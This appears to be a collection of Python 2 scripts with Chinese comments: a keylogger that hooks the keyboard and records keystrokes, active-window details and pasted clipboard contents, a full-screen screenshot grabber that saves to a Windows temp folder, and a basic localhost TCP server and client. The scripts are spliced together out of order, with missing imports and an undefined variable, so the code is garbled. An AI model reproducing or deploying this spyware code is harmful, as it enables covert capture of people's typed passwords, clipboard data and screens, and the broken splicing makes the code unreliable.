# -*- coding: utf-8 -*-  
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
 
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
 
#
def get_current_process():
 
    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()
 
    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
 
    # 将进程ID存入变量中
    process_id = "%d" % pid.value
 
    # 申请内存
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
 
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
 
    # 读取窗口标题
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
 
    # 打印
    print
    print "[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value)
    print
 
    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
 
# 定义击键监听事件函数
def KeyStroke(event):
 
    global current_window
 
    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.WindowName != current_window:
        current_window = event.WindowName
        # 函数调用
        get_current_process()
 
    # 检测击键是否常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii <127:
        print chr(event.Ascii),
    else:
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print "[PASTE]-%s" % (pasted_value),
        else:
            print "[%s]" % event.Key,
    # 循环监听下一个击键事件
    return True
 
# 创建并注册hook管理器
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke
 
# 注册hook并执行
kl.HookKeyboard()
pythoncom.PumpMessages()

# 分辨率适应
width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
 
# 创建设备描述表
desktop_dc = win32gui.GetWindowDC(hdesktop)
img_dc = win32ui.CreateDCFromHandle(desktop_dc)
 
# 创建一个内存设备描述表
mem_dc = img_dc.CreateCompatibleDC()
 
# 创建位图对象
screenshot = win32ui.CreateBitmap()
screenshot.CreateCompatibleBitmap(img_dc, width, height)
mem_dc.SelectObject(screenshot)
 
# 截图至内存设备描述表
mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
 
# 将截图保存到文件中
screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\screenshot.bmp')
 
# 内存释放
mem_dc.DeleteDC()

# -*- coding: utf-8 -*-
import socket
import threading
 
# 监听的IP及端口
bind_ip = "127.0.0.1"
bind_port = 9999
 
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
server.bind((bind_ip,bind_port))
 
server.listen(5)
 
print "[*] Listening on %s:%d" % (bind_ip,bind_port)
 
def handle_client(client_socket):
 
    request = client_socket.recv(1024)
 
    print "[*] Received:%s" % request
 
    client_socket.send("ok!")
 
    client_socket.close()
 
while True:
 
    client,addr = server.accept()
 
    print "[*] Accept connection from:%s:%d" % (addr[0],addr[1])
 
    client_handler = threading.Thread(target=handle_client,args=(client,))
 
    client_handler.start()
win32gui.DeleteObject(screenshot.GetHandle())

# -*- coding: utf-8 -*-
import socket
 
# 目标地址IP/URL及端口
target_host = "127.0.0.1"
target_port = 9999
 
# 创建一个socket对象
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
# 连接主机
client.connect((target_host,target_port))
 
# 发送数据
client.send("GET / HTTP/1.1\r\nHOST:127.0.0.1\r\n\r\n")
 
# 接收响应
response = client.recv(4096)
 
print response
